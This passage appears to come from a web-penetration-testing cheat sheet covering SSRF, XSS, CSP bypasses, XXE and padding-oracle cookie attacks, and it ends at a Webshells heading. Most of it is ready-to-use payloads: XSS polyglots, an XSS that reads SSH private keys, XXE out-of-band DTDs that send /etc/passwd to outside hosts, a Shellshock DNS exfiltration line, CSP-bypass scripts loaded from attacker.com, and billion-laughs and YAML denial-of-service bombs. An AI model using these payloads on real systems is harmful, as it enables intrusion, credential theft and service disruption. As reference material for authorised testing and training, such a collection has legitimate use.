•  Force content-type for your response. If you return application/json, then your content-type response is application/json.
•  Don't return sensitive data like credentials, Passwords, or security tokens.
•  Return the proper status code according to the operation completed. (e.g. 200 OK, 400 Bad Request, 401 Unauthorized, 405 Method Not Allowed, etc.).
• If you find sensitive resource like /receipt try /download_receipt,/export_receipt.
• Export pdf - try XSS or HTML injection
   ◇ LFI: username=<iframe src="file:///C:/windows/system32/drivers/etc/hosts" height=1000 width=1000/>
   ◇ SSRF: <object data=”http://127.0.0.1:8443”/>
   ◇ Open Port: <img src=”http://127.0.0.1:445”/> if delay is < 2.3 secs is open
   ◇ Get real IP: <img src=”https://iplogger.com/113A.gif”/>
   ◇ DoS: <img src=”http://download.thinkbroadband.com/1GB.zip”/>
      ▪ <iframe src=”http://example.com/RedirectionLoop.aspx”/>

CI & CD
•  Audit your design and implementation with unit/integration tests coverage.
•  Use a code review process and disregard self-approval.
•  Ensure that all components of your services are statically scanned by AV software before pushing to production, including vendor libraries and other dependencies.
•  Design a rollback solution for deployments.
```

## **SSRF**

```text
SSRF:

Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing.
In typical SSRF examples, the attacker might cause the server to make a connection back to itself, or to other web-based services within the organization's infrastructure, or to external third-party systems.

- SSRF attack against the server:

    • Browse to /admin and observe that you can't directly access the admin page.
    • Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
    • Change the URL in the stockApi parameter to http://localhost/admin. This should display the administration interface.
    • Read the HTML to identify the URL to delete the target user, which is: http://localhost/admin/delete?username=carlos
    • Submit this URL in the stockApi parameter, to deliver the SSRF attack.

- SSRF against others

    • Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Intruder.
    • Click "Clear §", change the stockApi parameter to http://192.168.0.1:8080/admin then highlight the final octet of the IP address (the number 1), click "Add §".
    • Switch to the Payloads tab, change the payload type to Numbers, and enter 1, 255, and 1 in the "From" and "To" and "Step" boxes respectively.
    • Click "Start attack".
    • Click on the "Status" column to sort it by status code ascending. You should see a single entry with a status of 200, showing an admin interface.
    • Click on this request, send it to Burp Repeater, and change the path in the stockApi to: /admin/delete?username=carlos

- SSRF with blacklist

    • Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
    • Change the URL in the stockApi parameter to http://127.0.0.1/ and observe that the request is blocked.
    • Bypass the block by changing the URL to: http://127.1/
    • Change the URL to http://127.1/admin and observe that the URL is blocked again.
    • Obfuscate the "a" by double-URL encoding it to %2561 to access the admin interface and delete the target user.


- SSRF with whitelist

    • Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
    • Change the URL in the stockApi parameter to http://127.0.0.1/ and observe that the application is parsing the URL, extracting the hostname, and validating it against a whitelist.
    • Change the URL to http://username@stock.weliketoshop.net/ and observe that this is accepted, indicating that the URL parser supports embedded credentials.
    • Append a # to the username and observe that the URL is now rejected.
    • Double-URL encode the # to %2523 and observe the extremely suspicious "Internal Server Error" response, indicating that the server may have attempted to connect to "username".
    • Change the URL to http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos to access the admin interface and delete the target user.

- SSRF Open redirection:

    • Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
    • Try tampering with the stockApi parameter and observe that it isn't possible to make the server issue the request directly to a different host.
    • Click "next product" and observe that the path parameter is placed into the Location header of a redirection response, resulting in an open redirection.
    • Create a URL that exploits the open redirection vulnerability, and redirects to the admin interface, and feed this into the stockApi parameter on the stock checker: /product/nextProduct?path=http://192.168.0.12:8080/admin
    • The stock checker should follow the redirection and show you the admin page. You can then amend the path to delete the target user: /product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos

- SSRF out-of-band:

    • In Burp Suite Professional, go to the Burp menu and launch the Burp Collaborator client.
    • Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.
    • Visit a product, intercept the request in Burp Suite, and send it to Burp Repeater.
    • Change the Referer header to use the generated Burp Collaborator domain in place of the original domain. Send the request.
    • Go back to the Burp Collaborator client window, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously.
    • You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.

- Blind SSRF with Shellshock:

    • In Burp Suite Professional, install the "Collaborator Everywhere" extension from the BApp Store.
    • Add the domain of the lab to Burp Suite's target scope, so that Collaborator Everywhere will target it.
    • Browse the site.
    • Observe that when you load a product page, it triggers an HTTP interaction with Burp Collaborator, via the Referer header.
    • Observe that the HTTP interaction contains your User-Agent string within the HTTP request.
    • Send the request to the product page to Burp Intruder.
    • Use Burp Collaborator client to generate a unique Burp Collaborator payload, and place this into the following Shellshock payload: () { :; }; /usr/bin/nslookup $(whoami).YOUR-SUBDOMAIN-HERE.burpcollaborator.net
    • Replace the User-Agent string in the Burp Intruder request with the Shellshock payload containing your Collaborator domain.
    • Click "Clear §", change the Referer header to http://192.168.0.1:8080 then highlight the final octet of the IP address (the number 1), click "Add §".
    • Switch to the Payloads tab, change the payload type to Numbers, and enter 1, 255, and 1 in the "From" and "To" and "Step" boxes respectively.
    • Click "Start attack".
    • When the attack completes, go back to the Burp Collaborator client window, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously.
    • You should see a DNS interaction that was initiated by the back-end system that was hit by the successful blind SSRF attack. The name of the OS user should appear within the DNS subdomain.
    • To complete the lab, enter the name of the OS user.


Web requesting other ip or ports like 127.0.0.1:8080 or 192.168.0.1

chat:3000/ssrf?user=&comment=&link=http://127.0.0.1:3000

GET /ssrf?user=&comment=&link=http://127.0.0.1:3000 HTTP/1.1

Enum IP or ports

**Tools**
https://github.com/tarunkant/Gopherus
```

## **XSS**

```text
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
https://portswigger.net/web-security/cross-site-scripting/preventing

Usage:
• Impersonate or masquerade as the victim user.
• Carry out any action that the user is able to perform.
• Read any data that the user is able to access.
• Capture the user's login credentials.
• Perform virtual defacement of the web site.
• Inject trojan functionality into the web site.

<script>alert(1)</script>

# XSS vectors
https://gist.github.com/kurobeats/9a613c9ab68914312cbb415134795b45

# XSpear
gem install XSpear
XSpear -u 'https://web.com' -a
XSpear -u 'https://www.web.com/?q=123' --cookie='role=admin' -v 1 -a 
XSpear -u "http://testphp.vulnweb.com/search.php?test=query" -p test -v 1

# Dalfox
https://github.com/hahwul/dalfox

- XSS filter bypasss polyglot:
';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg"> 

- XSS in filename:
"><img src=x onerror=alert(document.domain)>.gif

- XSS in metadata:
exiftool -FIELD=XSS FILE
exiftool -Artist=’ “><img src=1 onerror=alert(document.domain)>’ brute.jpeg

- XSS in Content:
SVG:
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>

- XSS in GIF Magic Number:
GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
If image can't load:
url.com/test.php?p=<script src=http://url.com/upload/img/xss.gif>

- XSS in png:
https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/

- XSS in PDF:
https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html?m=1

" <script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText.fontsize(1)) }; x.open("GET","file:///home/reader/.ssh/id_rsa"); x.send(); </script>
" <script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open("GET","file:///etc/passwd"); x.send(); </script>

https://brutelogic.com.br/blog/file-upload-xss/

# XSS Polyglots
';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>

">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg"> 

￼￼```

" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//

%3C!%27/!%22/!\%27/\%22/ — !%3E%3C/Title/%3C/script/%3E%3CInput%20Type=Text%20Style=position:fixed;top:0;left:0;font-size:999px%20*/;%20Onmouseenter=confirm1%20//%3E#
<!'/!”/!\'/\"/ — !></Title/</script/><Input Type=Text Style=position:fixed;top:0;left:0;font-size:999px */; Onmouseenter=confirm1 //>#
jaVasCript:/-//*\/'/"/*/(/ */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/ — !>\x3csVg/<sVg/oNloAd=alert()//>\x3e
">>

” ></plaintext></|><plaintext/onmouseover=prompt(1) >prompt(1)@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>’ →” > "></script>alert(1)”><img/id="confirm( 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'">">

" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//

?msg=<img/src=`%00`%20onerror=this.onerror=confirm(1)
<svg/onload=eval(atob(‘YWxlcnQoJ1hTUycp’))>

<sVg/oNloAd=”JaVaScRiPt:/**\/*\’/”\eval(atob(‘Y29uZmlybShkb2N1bWVudC5kb21haW4pOw==’))”> <iframe src=jaVaScrIpT:eval(atob(‘Y29uZmlybShkb2N1bWVudC5kb21haW4pOw==’))>

';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>

jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert())//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouse over=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><imgsrc="http://i.imgur.com/P8mL8.jpg">
```

### Reflected XSS

```text
The application receive data request and include it in the reponse without processing.

https://insecure-website.com/status?message=<script>alert(1)</script>

- Test every entry point including HTTP headers
- Submit random alphanumeric values, 8 chars to easily find the reflection. Burp Intruder grep payloads. 
- Determine the reflection context. Could be between html tags, quoted, javascript string...
- Test candidate payloads. Burp repeater, place the payload before or after the number and search the number to locate the payload.
- Test alternative payload. If the payload is modified look for alternative with the same context.
```

### **Stored XSS**

```text
Also known as persistent or second order. The application receive data from untrusted source and include it in later HTTP response in an unsafe way.

Save a comment in a web:

POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Length: 100

postId=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E&name=Carlos+Montoya&email=carlos%40normal-user.net

Check for entry points:
- Parameters or other data within the URL query string and message body.
- The URL file path.
- HTTP request headers that might not be exploitable in relation to reflected XSS.

Check for exit points:
- Data submitted to any entry point could in principle be emitted from any exit point. For example, user-supplied display names could appear within an obscure audit log that is only visible to some application users.
- Data that is currently stored by the application is often vulnerable to being overwritten due to other actions performed within the application. For example, a search function might display a list of recent searches, which are quickly replaced as users perform other searches.
```

### **Blind XSS**

```text
**Tools**
https://github.com/LewisArdern/bXSS
https://github.com/ssl/ezXSS
```

### **DOM XSS**

```text
Application contains some client-side JavaScript that processes data from an untrusted source in an unsafe way, usually by writing the data back to the DOM.

Example:

var search = document.getElementById('search').value;
var results = document.getElementById('results');
results.innerHTML = 'You searched for: ' + search;

You searched for: <img src=1 onerror='/* Bad stuff here... */'>

You have to locate your input in the DOM with browser developer tools.

- Reflected DOM XSS
- Stored DOM XSS


Possible sinks:

document.write()
document.writeln()
document.domain
someDOMElement.innerHTML
someDOMElement.outerHTML
someDOMElement.insertAdjacentHTML
someDOMElement.onevent

JQuery:

add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()
```

### **XSS to CSRF**

```text
Example:

Detect action to change email, with anti csrf token, get it and paste this in a comment to change user email:

<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/email/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

### **AngularJS Sandbox**

```text
Removed in AngularJS 1.6

Is a way to avoid some strings like window, document or __proto__.

- Without strings:
/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1

The exploit uses toString() to create a string without using quotes. It then gets the String prototype and overwrites the charAt function for every string. This effectively breaks the AngularJS sandbox. Next, an array is passed to the orderBy filter. We then set the argument for the filter by again using toString() to create a string and the String constructor property. Finally, we use the fromCharCode method generate our payload by converting character codes into the string x=alert(1). Because the charAt function has been overwritten, AngularJS will allow this code where normally it would not.

- With CSP:

<script>
location='https://your-lab-id.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>

The exploit uses the ng-focus event in AngularJS to create a focus event that bypasses CSP. It also uses $event, which is an AngularJS variable that references the event object. The path property is specific to Chrome and contains an array of elements that triggered the event. The last element in the array contains the window object.
Normally, | is a bitwise or operation in JavaScript, but in AngularJS it indicates a filter operation, in this case the orderBy filter. The colon signifies an argument that is being sent to the filter. In the argument, instead of calling the alert function directly, we assign it to the variable z. The function will only be called when the orderBy operation reaches the window object in the $event.path array. This means it can be called in the scope of the window without an explicit reference to the window object, effectively bypassing AngularJS's window check.
```

### **XSS in JS**

```text
- Inside JS script:
</script><img src=1 onerror=alert(document.domain)>
</script><script>alert(1)</script>

- Inside JS literal script:
'-alert(document.domain)-'
';alert(document.domain)//
'-alert(1)-'

- Inside JS that escape special chars:
If ';alert(document.domain)// is converted in \';alert(document.domain)//
Use \';alert(document.domain)// to obtain \\';alert(document.domain)//
\'-alert(1)//

- Inside JS with some char blocked:
onerror=alert;throw 1
/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27

The exploit uses exception handling to call the alert function with arguments. The throw statement is used, separated with a blank comment in order to get round the no spaces restriction. The alert function is assigned to the onerror exception handler. As throw is a statement, it cannot be used as an expression. Instead, we need to use arrow functions to create a block so that the throw statement can be used. We then need to call this function, so we assign it to the toString property of window and trigger this by forcing a string conversion on window.

- Inside {}
${alert(document.domain)}
${alert(1)}
```

![](../../../.gitbook/assets/xss2.png)

## **CSP**

```text
Content-Security-Policy Header

- If upload from web is allowed or <img src="URL">:
https://medium.com/@shahjerry33/pixel-that-steals-data-im-invisible-3c938d4c3888
https://iplogger.org/invisible/
https://iplogger.org/15bZ87

Scenario : 1
Content-Security-Policy: script-src https://facebook.com https://google.com 'unsafe-inline' https://*; child-src 'none'; report-uri /Report-parsing-url;By  observing this policy we can say it's damn vulnerable and will allow  inline scripting as well . The reason behind that is the usage of  unsafe-inline source as a value of script-src directive.
working payload : "/><script>alert(1337);</script>

Scenario : 2
Content-Security-Policy: script-src https://facebook.com https://google.com 'unsafe-eval' data: http://*; child-src 'none'; report-uri /Report-parsing-url;Again this is a misconfigured CSP policy due to usage of unsafe-eval.
working payload : <script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>

Scenario : 3
Content-Security-Policy: script-src 'self' https://facebook.com https://google.com https: data *; child-src 'none'; report-uri /Report-parsing-url;Again this is a misconfigured CSP policy due to usage of a wildcard in script-src.
working payloads :"/>'><script src=https://attacker.com/evil.js></script>"/>'><script src=data:text/javascript,alert(1337)></script>

Scenario: 4
Content-Security-Policy: script-src 'self' report-uri /Report-parsing-url;Misconfigured CSP policy again! we can see object-src and default-src are missing here.
working payloads :<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>

Scenario: 5
Content-Security-Policy: script-src 'self'; object-src 'none' ; report-uri /Report-parsing-url;we  can see object-src is set to none but yes this CSP can be bypassed too  to perform XSS. How ? If the application allows users to upload any type  of file to the host. An attacker can upload any malicious script and  call within any tag.
working payloads :"/>'><script src="/user_upload/mypic.png.js"></script>

Scenario : 6
Content-Security-Policy: script-src 'self' https://www.google.com; object-src 'none' ; report-uri /Report-parsing-url;In such scenarios where script-src is set to self and a particular domain which is whitelisted, it can be bypassed using jsonp. jsonp endpoints allow insecure callback methods which allow an attacker to perform xss.
working payload :"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>

Scenario : 7
Content-Security-Policy: script-src 'self' https://cdnjs.cloudflare.com/; object-src 'none' ; report-uri /Report-parsing-url;In  such scenarios where script-src is set to self and a javascript library  domain which is whitelisted. It can be bypassed using any vulnerable  version of javascript file from that library , which allows the attacker  to perform xss.
working payloads :<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
 <div ng-app ng-csp>
  {{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
 </div>"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>

Scenario : 8
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;If  the application is using angular JS and scripts are loaded from a  whitelisted domain. It is possible to bypass this CSP policy by calling  callback functions and vulnerable class. For more details visit this  awesome git repo.
working payloads :ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>"><script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>

Scenario : 9
Content-Security-Policy: script-src 'self' accounts.google.com/random/ website.with.redirect.com ; object-src 'none' ; report-uri /Report-parsing-url;In  the above scenario, there are two whitelisted domains from where  scripts can be loaded to the webpage. Now if one domain has any open  redirect endpoint CSP can be bypassed easily. The reason behind that is  an attacker can craft a payload using redirect domain targeting to other  whitelisted domains having a jsonp endpoint. And in this scenario XSS  will execute because while redirection browser only validated host, not  the path parameters.
working payload :">'><script src="https://website.with.redirect.com/redirect?url=https%3A//accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>">

Scenario : 10
Content-Security-Policy: 
default-src 'self' data: *; connect-src 'self'; script-src  'self' ;
report-uri /_csp; upgrade-insecure-requestsTHE  above CSP policy can be bypassed using iframes. The condition is that  application should allow iframes from the whitelisted domain. Now using a  special attribute srcdoc of iframe, XSS can be easily achieved.
working payloads :<iframe srcdoc='<script src="data:text/javascript,alert(document.domain)"></script>'></iframe>* sometimes it can be achieved using defer& async attributes of script within iframe (most of the time in new browser due to SOP it fails but who knows when you are lucky?)<iframe src='data:text/html,<script defer="true" src="data:text/javascript,document.body.innerText=/hello/"></script>'></iframe>


Mitigation : Proxy all the objects from third-party resources and create a   b . Although this is only one way of mitigation, their could be many.

- CSP with policy injection (only Chrome)
/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
```

## XXE

```text
XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any backend or external systems that the application itself can access.

- XXE to Retrieve files:

Suppose a shopping application checks for the stock level of a product by submitting the following XML to the server:
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
The application performs no particular defenses against XXE attacks, so you can exploit the XXE vulnerability to retrieve the /etc/passwd file by submitting the following XXE payload:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
This XXE payload defines an external entity &xxe; whose value is the contents of the /etc/passwd file and uses the entity within the productId value. This causes the application's response to include the contents of the file:
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin

Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
Insert the following external entity definition in between the XML declaration and the stockCheck element:
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
Then replace the productId number with a reference to the external entity: &xxe;
The response should contain "Invalid product ID:" followed by the contents of the /etc/passwd file.

- XXE to SSRF:

Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
Insert the following external entity definition in between the XML declaration and the stockCheck element:
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
Then replace the productId number with a reference to the external entity: &xxe;
The response should contain "Invalid product ID:" followed by the response from the metadata endpoint, which will initially be a folder name. Iteratively update the URL in the DTD to explore the API until you reach /latest/meta-data/iam/security-credentials/admin. This should return JSON containing the SecretAccessKey.

https://medium.com/@klose7/https-medium-com-klose7-xxe-attacks-part-1-xml-basics-6fa803da9f26
https://medium.com/@klose7/xxe-attacks-part-2-xml-dtd-related-attacks-a572e8deb478
https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9
https://medium.com/@ismailtasdelen/xml-external-entity-xxe-injection-payload-list-937d33e5e116
https://lab.wallarm.com/xxe-that-can-bypass-waf-protection-98f679452ce0/?fbclid=IwAR1M7QwQHf1rMJb_6Qb9HFdLbVBRhmr3FYl7dalh8LHCLuHiOU3ypWwPBxo

XXE
1. change password func -> JSON
2. converted to XML -> 200 OK
3. created dtd file on my ec2 and started webserver on port 80
4. crafted a XXE payload!
5. bounty!
Always convert POST/PUT/PATCH body to xml and resend req, don't forget to change the content-type.

# XXE
# Instead POST:

<?xml version="1.0" ?>
    <!DOCTYPE thp [
        <!ELEMENT thp ANY>
        <!ENTITY book "Universe">
    ]>
    <thp>Hack The &book;</thp>

Malicious XML:

<?xml version="1.0" ?><!DOCTYPE thp [ <!ELEMENT thp ANY>
<!ENTITY book SYSTEM "file:///etc/passwd">]><thp>Hack The
%26book%3B</thp>

# XXE OOB

<?xml version="1.0"?><!DOCTYPE thp [<!ELEMENT thp ANY >
<!ENTITY % dtd SYSTEM "http://example.com/payload.dtd"> %dtd;]>
<thp><error>%26send%3B</error></thp>

# Basic Test

<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>

# Classic XXE

<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>

<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>

Classic XXE Base64 encoded

<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>

# PHP Wrapper inside XXE

<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<contacts>
  <contact>
    <name>Jean &xxe; Dupont</name>
    <phone>00 11 22 33 44</phone>
    <adress>42 rue du CTF</adress>
    <zipcode>75000</zipcode>
    <city>Paris</city>
  </contact>
</contacts>

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "php://filter/convert.bae64-encode/resource=http://10.0.0.3" >
]>
<foo>&xxe;</foo>

# Deny Of Service - Billion Laugh Attack

<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>

# Yaml attack

a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]


# Blind XXE

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
<!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;">
]
>
<foo>&callhome;</foo>

# XXE OOB Attack (Yunusov, 2013)

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://publicServer.com/parameterEntity_oob.dtd">
<data>&send;</data>

File stored on http://publicServer.com/parameterEntity_oob.dtd
<!ENTITY % file SYSTEM "file:///sys/power/image_size">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://publicServer.com/?%file;'>">
%all;

# XXE OOB with DTD and PHP filter

<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://92.222.81.2/dtd.xml">
%sp;
%param1;
]>
<r>&exfil;</r>

File stored on http://92.222.81.2/dtd.xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://92.222.81.2/dtd.xml?%data;'>">

# XXE Inside SOAP

<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>

# XXE PoC

<!DOCTYPE xxe_test [ <!ENTITY xxe_test SYSTEM "file:///etc/passwd"> ]><x>&xxe_test;</x>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe_test [ <!ENTITY xxe_test SYSTEM "file:///etc/passwd"> ]><x>&xxe_test;</x>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe_test [<!ELEMENT foo ANY><!ENTITY xxe_test SYSTEM "file:///etc/passwd">]><foo>&xxe_test;</foo>
```

### **XXE Hidden Attack**

```text
- Xinclude

Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
Set the value of the productId parameter to:
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>

- File uploads:

Create a local SVG image with the following content:
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
Post a comment on a blog post, and upload this image as an avatar.
When you view your comment, you should see the contents of the /etc/hostname file in your image. Then use the "Submit solution" button to submit the value of the server hostname.
```

## Cookies

```text
Cookies error padding:

# Get cookie structure
padbuster http://10.10.119.56/index.php xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka 8 -cookies "hcon=xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka" -error "Invalid padding"

# Get cookie for other user (impersonation)
padbuster http://10.10.119.56/index.php xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka 8 -cookies "hcon=xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka" -error "Invalid padding" -plaintext 'user=administratorhc0nwithyhackme'
```

## Webshells

### **PHP**

```text
# system

